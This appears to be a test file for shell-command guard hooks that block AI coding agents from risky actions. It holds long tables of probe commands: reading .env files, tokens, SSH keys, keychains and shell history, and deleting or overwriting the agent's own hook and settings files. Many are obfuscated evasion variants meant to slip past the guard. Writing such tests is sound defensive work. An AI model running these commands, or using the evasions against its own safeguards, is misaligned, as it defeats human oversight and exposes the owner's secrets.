  'M-10': ['echo "{}" > .claude/settings.json', 'rm .claude/hooks/command-guard.mjs'],
  lows: [
    'grep --color KEY .env', 'git push --m', 'git -c remote.origin.mirror=true push', 'csh -c "ssh x"', 'tcsh -c "ssh x"', 'arch ssh x', 'script -q /dev/null ssh x', 'nocorrect ssh x', 'coproc ssh x', 'ssh-copy-id x', 'pnpm pm2 list',
    'git-credential-osxkeychain get', 'cat ~/.zsh_h*', 'cat ~/.zsh_sessions/x.history', 'cat $HISTFILE',
    'git push origin "$BRANCH"', // by design (runbook "Known gaps")
  ],
}
const A77B_M9_READONLY_REFUSED = ['git checkout .', 'git checkout -f main', 'git switch --discard-changes', 'git worktree add -b x', 'git worktree add ../zz', 'git merge --no-commit --ff-only origin/main', 'git fetch --depth 1', 'gh pr checkout 5']
const A77B_ALLOWED_ALL = ['test -f .env.example', 'ls .env.example', 'cast --help'] // A77c: `test -f .env.local`, `ls .env*`, `cast send --help` are now layer-0 refusals
const A77B_HEREDOC_COMMIT = 'git commit -m "$(cat <<\'EOF\'\nfeat: x\n\nit\'s fine\nEOF\n)"' // commit stays refused for recon/auditor by design
const A77B_ALLOWED_READONLY = ['git merge --abort', 'git merge --quit', 'git tag -l', 'git config --get user.name', 'git merge-base HEAD origin/main', 'git rev-list --count HEAD', 'git merge --no-commit --no-ff origin/main', 'git worktree add --detach /tmp/w origin/main']

/** The exit code the harness sees: both PreToolUse hooks of settings.json, each as `node … || exit 2`; any 2 blocks. */
function hookExit(command, agentType, cwd = WT) { // default: a linked worktree, where the agents are meant to work
  const input = JSON.stringify({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command }, ...(agentType ? { agent_type: agentType } : {}), ...(cwd ? { cwd } : {}) })
  for (const h of ['command-guard.mjs', 'readonly-guard.mjs']) {
    const r = spawnSync('sh', ['-c', `node "${path.join(ROOT, '.claude', 'hooks', h)}" || exit 2`], { input, encoding: 'utf8' })
    if (r.status !== 0) return r.status
  }
  return 0
}

describe('A77b report probes — refused (exit 2 through both hooks, main session and every agent type)', () => {
  for (const [id, cmds] of Object.entries(A77B_REFUSED)) {
    for (const c of cmds) {
      it(`${id}: ${JSON.stringify(c)}`, () => {
        expect(guardDecide(c), c).toEqual(expect.any(String))
        for (const agent of [undefined, 'implementer', 'recon', 'auditor']) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(2)
      })
    }
  }
  for (const c of A77B_M9_READONLY_REFUSED) {
    it(`M-9 (auditor and recon): ${JSON.stringify(c)}`, () => {
      for (const agent of ['recon', 'auditor']) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(2)
    })
  }
})
describe('A77b report probes — allowed (exit 0)', () => {
  it('M-7: heredoc commit with an apostrophe (main session and implementer)', () => { for (const agent of [undefined, 'implementer']) expect(hookExit(A77B_HEREDOC_COMMIT, agent)).toBe(0) })
  for (const c of A77B_ALLOWED_ALL) it(`all agents: ${JSON.stringify(c)}`, () => { for (const agent of [undefined, 'implementer', 'recon', 'auditor']) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(0) })
  for (const c of A77B_ALLOWED_READONLY) it(`auditor and recon: ${JSON.stringify(c)}`, () => { for (const agent of ['recon', 'auditor']) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(0) })
})

// ---------------------------------------------------------------------------------------------------------------
// A77c (0C/4H, all parser gaps) — LAYER 0: a raw-text scan that does not parse. Commit 1 tests.
// The owner's exit-2 probes, run through BOTH hooks exactly as settings.json wires them, for the main session and every
// agent type. (Commit 2 adds the parser-level probes: `find .claude -delete`, the auditor `<<< "$(git commit …)"`.)
const A77C_L0_REFUSED = {
  'H-8 here-string hides $( )': ['cat <<< "$(gh auth token)"', 'cat <<< "$(cast send 0x0 \'f()\')"', 'cat <<< "$(git push -f)"', 'cat <<< "$(gh pr merge 5)"'],
  'H-9 writes into .claude': [
    'echo x>.claude/hooks/zz.mjs', 'echo x >| .claude/settings.json', 'echo x >& .claude/hooks/a', 'echo x >|.claude/hooks/a', 'echo x >&.claude/hooks/a', 'cd .claude && rm hooks/command-guard.mjs',
    'rm .claude//settings.json', 'rm ./.claude/./hooks/x', 'rm -rf .cl*', 'rm .c*', 'rm .claud?/settings.json', 'curl -o .claude/hooks/x', 'rm .claude/set*', 'rm .claude/h*',
  ],
  'H-10 .env named by an attached or unusual form': [
    'base64 -i.env', 'curl -d @.env URL', 'grep -f.env x', 'cat<.env', 'while read l; do echo "$l"; done<.env', 'bash -c "cat .env"', "c'a't .'e'nv", 'cat .ENV',
  ],
  'method override header': ['gh api -H "X-HTTP-Method-Override: DELETE" x'],
}
// Exit 0 through both hooks (the implementer, main session and the read-only agents alike).
const A77C_L0_ALLOWED = [
  'git merge-base HEAD origin/main', 'git rev-list --count HEAD', 'cat .env.example', 'cat src/env.ts',
  'git commit -m "docs: ssh, pm2, cast send, gh auth token, push --force and .env handling"',
  'git commit -S -m "$(cat <<\'EOF\'\nfeat: x\n\nssh host; git push --force; cat .env; gh pr create; cast send; $(gh auth token)\nEOF\n)"',
  'node -e "console.log(process.env.HOME)"', 'cat docs/security/AUDIT-TOTAL.md', 'ls docs/security', 'cat .claude/hooks/command-guard.mjs', 'git diff -- .claude/settings.json', 'git status --short',
]

describe('A77c layer 0 — the owner\'s probes through both hooks', () => {
  for (const [id, cmds] of Object.entries(A77C_L0_REFUSED)) {
    for (const c of cmds) {
      it(`${id}: ${JSON.stringify(c)}`, () => {
        expect(guardDecide(c), c).toEqual(expect.any(String))
        for (const agent of [undefined, 'implementer', 'recon', 'auditor']) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(2)
      })
    }
  }
  for (const c of A77C_L0_ALLOWED) {
    it(`allowed: ${JSON.stringify(c)}`, () => {
      expect(guardDecide(c), c).toBeNull()
      // a commit is refused for recon/auditor by readonly-guard on purpose; every other row runs for all four
      const agents = /^git commit/.test(c) ? [undefined, 'implementer'] : [undefined, 'implementer', 'recon', 'auditor']
      for (const agent of agents) expect(hookExit(c, agent), `${agent}: ${c}`).toBe(0)
    })
  }
  it('the refusal names the token and the layer', () => {
    expect(guardDecide('cat <<< "$(gh auth token)"')).toMatch(/layer 0 raw-text scan \(credentials\): "gh auth"/)
    expect(guardDecide('base64 -i.env')).toMatch(/layer 0 raw-text scan \(env\): "\.env"/)
  })
})

// Per rule: spellings that must be refused (the text contains the name, however the shell would have read it) and
// near-misses that must pass (word boundaries, paths, other tools).
const L0_CASES = {
  env: {
    refuse: ['cat .env', 'cat ".env"', 'cat .env.local', 'cat apps/web/.env.production', 'base64 -i.env', 'grep -f.env x', 'curl -d @.env URL', 'cat<.env', 'node --env-file=.env x.js', 'x=.env', 'tail -n1.env', 'cat .env*', 'cat .ENV', 'cat .en\\v', 'cat .e"n"v'],
    allow: ['cat .env.example', 'cat ./.env.example', 'cat src/env.ts', 'cat env.ts', 'node -e "console.log(process.env.HOME)"', 'python3 -c "import os; print(os.environ)"', 'echo import.meta.env.VITE_X', 'ls docs'],
  },
  harness: {
    refuse: ['echo x > .claude/settings.json', 'tee .claude/hooks/a', 'rm .claude//settings.json', 'cp x ./.claude/./hooks/y', 'cd .claude', 'pushd ./.claude/hooks', 'git -C .claude rm hooks/x', 'cd -P .claude && rm settings.json',
      'rm -rf .cl*', 'rm .c*', 'rm .claud?/settings.json', 'rm .{cl,x}aude/settings.json', 'rm .claude/set*', 'rm .claude/h*', 'rm .claude/*', 'cat .claude/hooks/x > y', 'cat .claude/hooks/x | tee y', 'ls .claude/hooks; rm x',
      'cat $(echo .claude/hooks/x)', 'git diff --output=x .claude/hooks', 'sed -n 1p .claude/settings.json', 'git add .claude/hooks/x', 'node .claude/hooks/command-guard.mjs', 'cd "$PWD/.claude"'],
    allow: ['cat .claude/settings.json', 'head -5 .claude/hooks/command-guard.mjs | tail -2', 'grep -rn deny .claude/settings.json', 'git diff -- .claude/hooks', 'git log --oneline -- .claude/settings.json', 'ls -la .claude', 'wc -l .claude/hooks/*.mjs',
      'stat .claude/hooks', 'git show HEAD:.claude/settings.json', 'echo x > .claude/agents/a.md', 'cp a .claude/skills/b', 'ls .c*', 'rg deny .claude | head'],
  },
  credentials: {
    refuse: ['gh auth token', 'gh auth status --show-token', 'gh -R a/b auth login', 'git credential fill', 'git-credential-osxkeychain get', 'GIT-CREDENTIAL-X get', 'echo --show-token'],
    allow: ['gh pr view 5 --json author', 'git log --author=x', 'cat docs/authentication.md', 'gh pr view 5'],
  },
  cast: {
    refuse: ['cast send 0x0 "f()"', 'cast publish 0xab', 'cast mktx 0x0 "f()"', 'cast wallet new', 'cast erc20 transfer 0x0 1', 'cast --rpc-url x send 0x0', 'cast sig "send(address)"', 'cast send --help', 'sh -c "cast send 0x0"'],
    allow: ['cast call 0x0 "f()"', 'cast block-number', 'cast balance 0x0', 'forecast send mail', 'podcast wallet', 'cast --help'],
  },
  broadcast: {
    refuse: ['forge script S.s.sol --broadcast', 'forge script S --broadcast=true', 'forge script --broadcast S'],
    allow: ['forge script S.s.sol --rpc-url x', 'forge test', 'forge build'],
  },
  push: {
    refuse: ['git push -f', 'git push -uf origin x', 'git push -fu origin x', 'git push --force-with-lease', 'git push --mirror', 'git push --mirr', 'git push --m', 'git push --delete origin x', 'git push -d origin x', 'git push origin +x',
      'git push origin HEAD:+x', 'git push origin :x', 'git push --prune origin x', 'echo $(git push -f)', 'sh -c "git push -f"', 'git push --f', 'git push --d', 'git -C wt push origin x --force'],
    allow: ['git push', 'git push -u origin chore/agent-harness', 'git push origin chore/force-field-copy', 'git push --follow-tags', 'git push --dry-run origin x', 'git push -o ci.skip origin x', 'git push --set-upstream origin x',
      'git push --no-verify origin x', 'git push origin chore/push-notifications', 'git push origin HEAD:refs/heads/chore/x', 'git push origin refs/heads/x:refs/heads/x', 'git push -n origin x'],
  },
  'gh-write': {
    refuse: ['gh pr merge 5', 'gh pr create', 'gh pr new', 'gh pr ready 5', 'gh pr close 5', 'gh pr edit 5', 'gh pr review 5', 'gh pr comment 5', 'gh api -X POST x', 'gh api -XPOST x', 'gh api --method PATCH x', 'gh api x -f a=b',
      'gh api x -F a=b', 'gh api x --field a=b', 'gh api x --raw-field a=b', 'gh api x --input f', 'gh api -H "X-HTTP-Method-Override: DELETE" x', 'gh api -ifa=b x', 'gh api -X GET repos/a/b', 'gh pr view 5 -R a/b close'],
    allow: ['gh pr view 5', 'gh pr list --state merged', 'gh pr checks 5', 'gh api repos/a/b/pulls/5', 'gh api repos/a/b -q .name', 'gh pr view 5 --json reviewDecision', 'gh pr checkout 5', 'gh api repos/a/b/contents/x-f', 'gh run view 5', 'gh issue view 5'],
  },
  'remote-shell': {
    refuse: ['ssh host', 'scp a b:c', 'sftp h', 'ssh-add -l', 'ssh-agent', 'ssh-copy-id h', 'pm2 ls', 'cat ~/.ssh/id_ed25519', 'echo hi | ssh h', 'sh -c "ssh h"', 'which ssh', 'ls docs/ssh', '/usr/bin/ssh host', 'SSH host'],
    allow: ['npm view ssh2 version', 'cat docs/ssh-signing.md', 'git log --oneline -- docs/ssh-notes.md', 'echo pm2x', 'git push origin fix/ssh-signing'],
  },
  keychain: {
    refuse: ['security find-generic-password -s x', '/usr/bin/security dump-keychain', 'env security list-keychains', 'security', 'security -i', 'echo a | security', 'security -q find-internet-password'],
    allow: ['cat docs/security/AUDIT-TOTAL.md', 'ls docs/security', 'grep -rn security docs/security', 'git log -- docs/security', 'cat docs/security/SECURITY.md', 'grep security docs/x.md'],
  },
  'upload-pack': {
    refuse: ['git fetch --upload-pack=x', 'git ls-remote --upload-pack x origin', 'git push --receive-pack=x'],
    allow: ['git fetch origin', 'git ls-remote origin'],
  },
  history: {
    refuse: ['cat ~/.zsh_history', 'tail ~/.bash_history', 'cat ~/.zsh_sessions/x', 'cat $HISTFILE', 'cat ~/.local/share/fish/fish_history', 'cat ~/.python_history', 'cat ~/.history', 'cat ~/.node_repl_history', 'cat ~/.zhistory'],
    allow: ['grep -c history docs/x.md', 'cat docs/history.md', 'cat src/order-history.ts', 'git log --oneline'],
  },
}

describe('A77c layer 0 — per rule', () => {
  it('every rule has a table, and every table is a rule', () => {
    expect(Object.keys(L0_CASES).sort()).toEqual(LAYER0_RULES.map((r) => r.id).sort())
  })
  for (const [id, { refuse, allow }] of Object.entries(L0_CASES)) {
    describe(id, () => {
      for (const c of refuse) it(`refuses: ${JSON.stringify(c)}`, () => expect(rawScan(c), c).toMatch(new RegExp(`\\(${id}\\)`)))
      for (const c of allow) it(`passes: ${JSON.stringify(c)}`, () => expect(rawScan(c), c).toBeNull())
    })
  }
})

describe('A77c layer 0 — normalisation (no tokenising: quotes and backslashes removed, whitespace collapsed)', () => {
  it('lower-cases, strips quotes and backslashes, collapses whitespace, // and /./', () => {
    expect(normalise('C"a"t   .E\\nv')).toBe('cat .env')
    expect(normalise("rm  .claude//./hooks///x")).toBe('rm .claude/hooks/x')
    expect(normalise('a\n\tb')).toBe('a b')
  })
})

describe('A77c layer 0 — the ONE exemption: a lone `git commit` whose message holds no $, backtick or <', () => {
  const EXEMPT = [
    'git commit -m "docs: ssh and .env and gh auth token"', "git commit -m 'cat .env; ssh host; git push --force'", 'git commit -S -am "x: gh pr merge, cast send, pm2"', 'git commit --message="mentions .env and ssh"',
    'git commit -m "a" -m "b: ssh"', 'git commit -m "$(cat <<\'EOF\'\nssh; $(gh auth token); `x`; <b>\nEOF\n)"', 'git commit -m "$(cat <<-\'EOF\'\n\tssh host\n\tEOF\n)"',
  ]
  const NOT_EXEMPT = [
    'git commit -m "$(ssh host)"', 'git commit -m "`ssh host`"', 'git commit -m "a < b: ssh"', 'git commit -m "x" && ssh host', 'git commit -m "x"; ssh host', 'git commit -m "x" | ssh host', 'git commit -m "ssh" > out',
    'git commit -m "x" # ssh', 'git commit -m "x" --author="$(ssh h)"', 'git commit -m "$(cat <<EOF\nmention ssh\nEOF\n)"', 'git commit -m "$(cat <<\'EOF\'\nssh\n)"', 'git push -f',
     'echo git commit -m ssh', 'git commit -m "x', "git commit -m 'x", 'git commit -m $(ssh h)', 'git commit -m "a\nb" `ssh h`',
  ]
  for (const c of EXEMPT) it(`exempt (message literals removed, the rest scanned): ${JSON.stringify(c)}`, () => { expect(loneCommitRemainder(c), c).toEqual(expect.any(String)); expect(rawScan(c), c).toBeNull() })
  for (const c of NOT_EXEMPT) it(`not exempt: ${JSON.stringify(c)}`, () => {
    expect(loneCommitRemainder(c), c).toBeNull()
    if (/ssh|\.env|push -f|\.claude\/hooks/.test(c)) expect(rawScan(c), c).toEqual(expect.any(String))
  })
})

describe('A77c layer 0 — a lone commit is exempt for its message literals only: the rest of the command is still scanned', () => {
  for (const c of ['git commit -F .env', 'git commit -m "x" -- .claude/hooks', 'git commit -m "x" -F .env.local', 'git commit -m ".env" --author=ssh']) {
    it(`structure is a lone commit, remainder refused: ${JSON.stringify(c)}`, () => {
      expect(loneCommitRemainder(c), c).toEqual(expect.any(String))
      expect(rawScan(c), c).toEqual(expect.any(String))
    })
  }
})

describe('A77c layer 0 — pure readers may name the harness, nothing else may', () => {
  for (const c of ['cat .claude/settings.json', 'ls .claude/hooks', 'git diff .claude/hooks', 'git --no-pager log -1 -- .claude/settings.json', 'grep x .claude/hooks/a | head -3', 'stat .claude/hooks/x', 'diff .claude/settings.json /tmp/x']) {
    it(`pure reader: ${JSON.stringify(c)}`, () => expect(isPureReader(c), c).toBe(true))
  }
  for (const c of ['cat x > y', 'cat x; rm y', 'cat $(x)', 'cat x && ls', 'sed -n 1p x', 'git add x', 'git diff --output=f', 'cat <<< x', 'FOO=1 cat x', 'rg --pre cmd x']) {
    it(`not a pure reader: ${JSON.stringify(c)}`, () => expect(isPureReader(c), c).toBe(false))
  }
})

describe('A77c layer 1 keeps its own cast help rule (unreachable through decide while layer 0 refuses `send`)', () => {
  it('castAllowReason still allows `cast send --help`', () => { expect(castAllowReason(['cast', 'send', '--help'])).toBeNull() })
})

// ---------------------------------------------------------------------------------------------------------------
// A77c commit 2 — the parser fails closed (H-8 here-strings, H-9 attached redirects and paths). `decideParsed` is layer 1 ALONE (no raw-text scan), so every
// row below proves the tokenizer + per-command rules on their own; the process-level rows then prove both layers.
const L1_REFUSED = {
  'H-8 here-string operand is a normal word, so its $( ) is inspected': ['cat <<< "$(gh auth token)"', 'cat <<< "$(cast send 0x0 \'f()\')"', 'cat <<< "$(git push -f)"', 'cat <<< "$(gh pr merge 5)"', 'cat <<< $(git push -f)', 'cat <<<"$(git push -f)"', 'cat <<< "`git push -f`"'],
  'H-9 words split at unquoted < > >| >&': ['echo x>.claude/hooks/zz.mjs', 'echo x >| .claude/settings.json', 'echo x >& .claude/hooks/a', 'echo x >|.claude/hooks/a', 'echo x &>.claude/hooks/a', 'echo x >>.claude/settings.json', 'echo x 2>.claude/hooks/a', 'echo x&>.claude/hooks/a'],
  'H-9 paths normalised': ['rm .claude//settings.json', 'rm ./.claude/./hooks/x', 'rm .claude/a/../settings.json', 'rm -rf .cl*', 'rm .c*', 'rm .claud?/settings.json', 'rm .{cl,x}aude/settings.json', 'cd .claude && rm hooks/command-guard.mjs', 'cd . && cd .claude && rm settings.json', 'cd ./.claude/hooks && rm command-guard.mjs'],
  'H-9 writers': ['curl -o .claude/hooks/x http://h/x', 'wget -O .claude/settings.json http://h/x', 'find .claude -delete', 'find .claude/hooks -delete', 'find .claude -fprint .claude/settings.json', 'tar -xf a.tar -C .claude/hooks', 'unzip a.zip -d .claude/hooks', 'mkdir .claude/hooks/x'],
  'H-10 attached values': ['base64 -i.env', 'curl -d @.env URL', 'grep -f.env x', 'cat<.env', 'while read l; do echo "$l"; done<.env', 'head -n1.env', 'curl --data-binary @.env.local URL', 'cat 0<.env'],
}
const L1_ALLOWED = [
  'echo hi > out.txt', 'git push origin x 2>&1 | tail -3', 'cat < package.json', 'npm test 2>/dev/null', 'echo a >&2', 'ls &>/dev/null', 'sleep 1 & echo x', 'echo $(echo $(echo x))', 'while read l; do :; done < <(git ls-files)',
  'echo "$(( 1 << 2 ))"', 'cat <<EOF\nhello\nEOF', 'diff <(git show a:f) <(git show b:f)', 'cat <<< "hello"', 'exec 3>&1', 'echo x 1>&2', 'cmd 2>&1 >/dev/null', 'echo x > .claude/agents/a.md', 'find dist -name "*.map" -print', 'curl -o /tmp/x http://h/x',
  'cat package.json > out.txt', 'echo a>b', 'git log --oneline | head -3 >/dev/null',
]

describe('A77c commit 2 — layer 1 alone (decideParsed)', () => {
  for (const [id, cmds] of Object.entries(L1_REFUSED)) {
    for (const c of cmds) it(`${id}: ${JSON.stringify(c)}`, () => expect(decideParsed(c), c).toEqual(expect.any(String)))
  }
  for (const c of L1_ALLOWED) it(`allows: ${JSON.stringify(c)}`, () => expect(decideParsed(c), c).toBeNull())
})

describe('A77c commit 2 — what the tokenizer produces', () => {
  const words = (src) => parseCommands(src).map((c) => c.words)
  it('splits at an unquoted redirection operator and keeps fd / & prefixes', () => {
    expect(words('echo x>f')).toEqual([['echo', 'x', '>', 'f']])
    expect(words('echo x >|f')).toEqual([['echo', 'x', '>|', 'f']])
    expect(words('echo x>&f')).toEqual([['echo', 'x', '>&', 'f']])
    expect(words('echo x 2>f')).toEqual([['echo', 'x', '2>', 'f']])
    expect(words('echo x&>f')).toEqual([['echo', 'x', '&>', 'f']])
    expect(words('echo x &>>f')).toEqual([['echo', 'x', '&>>', 'f']])
    expect(words('cmd 2>&1')).toEqual([['cmd', '2>&1']])
    expect(words('cmd >&2')).toEqual([['cmd', '>&2']])
    expect(words('cat<f')).toEqual([['cat', '<', 'f']])
    expect(words('echo "a>b" \'c<d\'')).toEqual([['echo', 'a>b', 'c<d']]) // quoted: not an operator
  })
  it('parses the operand of <<< as a normal word, so its substitution is a command of its own', () => {
    const { cmds } = inspect('cat <<< "$(git push -f)"')
    expect(cmds.map((c) => c.base)).toEqual(expect.arrayContaining(['cat', 'git']))
    expect(words('cat <<< hello world')).toEqual([['cat', '<<<', 'hello', 'world']])
  })
  it('a redirect target is a file, a here-string operand is not', () => {
    const [c] = parseCommands('cat <<< .env')
    expect(c.redirs).toEqual([])
    const [d] = parseCommands('cat < .env')
    expect(d.redirs).toEqual(['<', '.env'])
  })
})

describe('A77c commit 2 — paths are normalised against the hook cwd (it follows Claude\'s `cd`)', () => {
  it('a relative word resolves against input.cwd', () => {
    for (const [cwd, c] of [['/repo/.claude', 'rm settings.json'], ['/repo/.claude', 'rm hooks/command-guard.mjs'], ['/repo/.claude', 'rm -rf .'], ['/repo/.claude/hooks', 'echo x > a.mjs'], ['/repo/.claude/hooks', 'rm command-guard.mjs'], ['/repo/.claude', 'cp x hooks/'], ['/repo/src', 'rm ../.claude/settings.json'], ['/repo/.claude/hooks', 'cd .. && rm settings.json']]) {
      expect(decideParsed(c, { cwd }), `${cwd}: ${c}`).toEqual(expect.any(String))
    }
  })
  it('the same words are fine elsewhere', () => {
    for (const [cwd, c] of [['/repo', 'rm x'], ['/repo/src', 'echo x > out.txt'], ['/repo/.claude', 'echo x > a.md'], ['/repo/.claude/agents', 'rm old.md'], ['/repo/.claude', 'cat settings.json'], ['/repo/.claude', 'cd .. && rm x']]) {
      expect(decideParsed(c, { cwd }), `${cwd}: ${c}`).toBeNull()
    }
  })
  it('the hook reads `cwd` from its input JSON', () => {
    expect(hookExit('rm settings.json', undefined, '/repo/.claude')).toBe(2)
    expect(hookExit('rm settings.json', undefined, '/repo')).toBe(0)
  })
})

describe('A77c commit 2 — anything the parser cannot classify is refused, naming the construct', () => {
  const UNCLASSIFIABLE = {
    'unterminated single quote': ["echo 'x", 'echo ok; echo \'x'],
    'unterminated double quote': ['echo "x', 'echo "a $(echo b)'],
    'unterminated backtick': ['echo `ls'],
    'unterminated $(': ['echo $(ls'],
    'unknown redirection operator': ['echo a >>> f', 'echo a >>| f', 'echo a >>& f', 'echo a >< f', 'echo a <>> f'],
    'unknown operator "<<<<"': ['cat <<<< x'],
    'nesting deeper than 3': ['echo $(echo $(echo $(echo $(echo x))))', 'sh -c "sh -c \\"sh -c \\\\\\"sh -c true\\\\\\"\\""'],
  }
  for (const [construct, cmds] of Object.entries(UNCLASSIFIABLE)) {
    for (const c of cmds) {
      it(`${construct}: ${JSON.stringify(c)}`, () => {
        let err
        try { inspect(c) } catch (e) { err = e }
        expect(err, c).toBeInstanceOf(ParseError)
        expect(err.message).toContain(construct.replace(/^unknown operator "<<<<"$/, 'unknown operator'))
      })
    }
  }
  it('three levels of nesting are still classified', () => {
    expect(decideParsed('echo $(echo $(echo $(echo x)))')).toBeNull()
    expect(decideParsed('echo $(echo $(echo $(ssh h)))')).toEqual(expect.any(String))
  })
  it('through the hook: exit 2, "failing closed", and the construct is named on stderr', () => {
    const GUARD = path.join(ROOT, '.claude', 'hooks', 'command-guard.mjs')
    for (const [command, construct] of [['echo a >>> f', 'unknown redirection operator'], ['echo $(echo $(echo $(echo $(echo x))))', 'nesting deeper than 3'], ["echo 'x", 'unterminated single quote']]) {
      const r = spawnSync('sh', ['-c', `node "${GUARD}" || exit 2`], { input: JSON.stringify({ tool_input: { command } }), encoding: 'utf8' })
      expect(r.status, command).toBe(2)
      expect(r.stderr).toContain('failing closed')
      expect(r.stderr).toContain(construct)
    }
  })
})

describe('A77c commit 2 — the owner\'s remaining exit-2 probes through both hooks', () => {
  it('find .claude -delete is refused for every agent', () => {
    for (const agent of [undefined, 'implementer', 'recon', 'auditor']) expect(hookExit('find .claude -delete', agent), String(agent)).toBe(2)
  })
  it('auditor and recon: <<< "$(git commit -m x)" is refused by readonly-guard (the main session may commit)', () => {
    const c = 'cat <<< "$(git commit -m x)"'
    for (const agent of ['recon', 'auditor']) { expect(hookExit(c, agent), agent).toBe(2); expect(roDecide(c), c).toEqual(expect.any(String)) }
    for (const agent of [undefined, 'implementer']) expect(hookExit(c, agent), String(agent)).toBe(0)
  })
  it('read-only parser: here-string operands are inspected too', () => {
    for (const c of ['cat <<< "$(git push)"', 'echo x <<< "$(git pull)"', 'cat <<<"$(git add .)"', 'cat <<< "$(gh pr create)"']) expect(roDecide(c), c).toEqual(expect.any(String))
    for (const c of ['cat <<< "$(git status)"', 'cat <<< hello']) expect(roDecide(c, { cwd: WT }), c).toBeNull()
  })
})

// ---------------------------------------------------------------------------------------------------------------
// A77c commit 4 — runbook and lows (L-1 no placeholders, L-2 the Read deny also stops Bash readers, L-3 gtimeout-style wrappers).
describe('A77c L-3: GNU-prefixed coreutils wrappers (Homebrew) are unwrapped by layer 1 like their BSD names', () => {
  for (const c of ['gtimeout 5 ssh host', 'gnohup ssh host', 'gstdbuf -oL ssh host', 'genv ssh host', 'genv FOO=1 ssh host', 'gxargs ssh', 'gtime ssh host', 'gnice -n 5 git push -f', 'gtimeout 5 gnohup genv ssh host', 'gtimeout -k 2 5 pm2 ls', 'gtimeout 5 gh pr merge 5', 'gtimeout 5 cast send 0x0']) {
    it(`layer 1 alone refuses: ${JSON.stringify(c)}`, () => expect(decideParsed(c), c).toEqual(expect.any(String)))
  }
  for (const c of ['gtimeout 60 npm test', 'gnice -n 5 npm test', 'genv FOO=1 npm test', 'gnohup npm run build', 'gxargs echo', 'gtimeout 5 git status']) {
    it(`allows: ${JSON.stringify(c)}`, () => expect(decideParsed(c), c).toBeNull())
  }
})

describe('A77c runbook: no placeholders, the three layers in five lines, the line-105 correction', () => {
  const rb = readFileSync(path.join(ROOT, 'docs', 'Runbooks', 'agent-harness.md'), 'utf8')
  it('L-1: no ellipsis placeholder anywhere in the runbook, the agent files or the skills', () => {
    expect(rb).not.toContain('…')
    for (const dir of ['agents', 'skills']) {
      for (const f of readdirSync(path.join(ROOT, '.claude', dir), { recursive: true }).filter((x) => String(x).endsWith('.md'))) {
        expect(readFileSync(path.join(ROOT, '.claude', dir, String(f)), 'utf8'), `${dir}/${f}`).not.toContain('…')
      }
    }
  })
  it('the three layers are summarised in five lines (heading sentence + one line per layer + the wiring line)', () => {
    const start = rb.indexOf('Three layers;')
    expect(start).toBeGreaterThan(0)
    const block = rb.slice(start, rb.indexOf('\n\n', start)).split('\n')
    expect(block).toHaveLength(5)
    expect(block[1]).toMatch(/Layer 0, raw-text scan/)
    expect(block[2]).toMatch(/Layer 1, parser and rules/)
    expect(block[3]).toMatch(/Layer 2, `permissions\.deny`/)
  })
  it('L-2: the Read/Edit deny rules are described as also stopping recognised Bash readers and redirect targets', () => {
    const line = rb.split('\n').find((l) => l.startsWith('- **Recursive reads')) ?? ''
    expect(line).not.toMatch(/cover the Read and Edit tools only/)
    for (const needle of ['`cat`', '`head`', '`tail`', '`sed`', '`tee`', 'redirects', 'sandbox']) expect(line, needle).toContain(needle)
  })
  it('L-3: wrappers are listed under "What this cannot stop"', () => {
    const section = rb.slice(rb.indexOf('## What this cannot stop'), rb.indexOf('The backstops are outside'))
    for (const needle of ['gtimeout', 'gnice', 'watch', 'parallel', 'flock', 'chpst', 'setpriv']) expect(section, needle).toContain(needle)
  })
  it('documents layer 0: the rules, the one exemption and that it over-refuses', () => {
    const section = rb.slice(rb.indexOf('## Layer 0'), rb.indexOf('## Allow-lists'))
    expect(section.length).toBeGreaterThan(500)
    for (const needle of ['.env.example', '--show-token', 'git-credential', '--upload-pack', 'zsh_history', '`--broadcast`', 'The one exemption', 'lone `git commit`', 'over-refuses on purpose', 'src/env.ts']) expect(section, needle).toContain(needle)
    expect((section.match(/^\| (env|harness|credentials|cast|push|gh writes|remote shells|history) \|/gm) ?? []).length).toBe(8)
  })
  it('the cwd and cd handling and the parser fail-closed rule are documented', () => {
    expect(rb).toMatch(/resolved against the hook's `cwd`/)
    expect(rb).toMatch(/nesting deeper than 3/)
  })
})

// ---------------------------------------------------------------------------------------------------------------
// A77d commit 2 — everyday work that was over-refused (items 1-8 + the read-only history readers). Each ALLOWED row runs
// through BOTH wired hooks for the agents that may run it; each REFUSED row is a near-miss that must stay refused
// (nothing is loosened beyond the item).
const ALL_AGENTS = [undefined, 'implementer', 'recon', 'auditor']
const MAIN_IMPL = [undefined, 'implementer'] // git add / commit / stash push / push are the read-only agents' refusals by design
const READ_ONLY = ['recon', 'auditor']
const COMMIT_EXAMPLE = 'git add -A && git commit -m "$(cat <<\'EOF\'\nfeat: x\n\nmentions .env, .claude/hooks, ssh and gh auth token\nEOF\n)"'
const A77D_ALLOWED = {
  '1 a forbidden word as a flag VALUE (git log --grep=security)': { agents: ALL_AGENTS, cmds: ['git log --grep=security', 'git log --oneline --grep=security -5', 'grep security docs/x.md'] },
  '2 bash --version / --help': { agents: ALL_AGENTS, cmds: ['bash --version', 'bash --help'] },
  '3 a variable NAME is not the wallet subcommand': { agents: ALL_AGENTS, cmds: ['cast call 0x0 "f()" "$WALLET"', 'cast call 0x0 "f()" "${WALLET}"', 'cast call 0x0 "f()" $SEND'] },
  '4 gh write flags only in the pipeline segment that holds gh': { agents: ALL_AGENTS, cmds: ['gh pr diff 660 | grep -F x', 'gh pr diff 660 | cut -d/ -f1-2', 'gh pr diff 660 --name-only | sort -f | head -3', 'gh pr view 5 --json files | jq -r .files[].path'] },
  '5 push flags only from push to the next separator; stash push is not git push': { agents: MAIN_IMPL, cmds: ['git stash push -m "a + b"', 'git stash push -m "a plus b"', 'git fetch --prune origin && git push origin chore/x', 'git fetch --prune origin; git push origin chore/x', 'git push origin chore/x 2>&1 | tail -f /dev/null'] },
  '6 git add … && git commit with a message that mentions forbidden words': { agents: MAIN_IMPL, cmds: [COMMIT_EXAMPLE, 'git add -A && git commit -S -m "docs: .env and ssh"', 'git add src/a.ts docs/b.md && git commit -m "x: gh pr merge"'] },
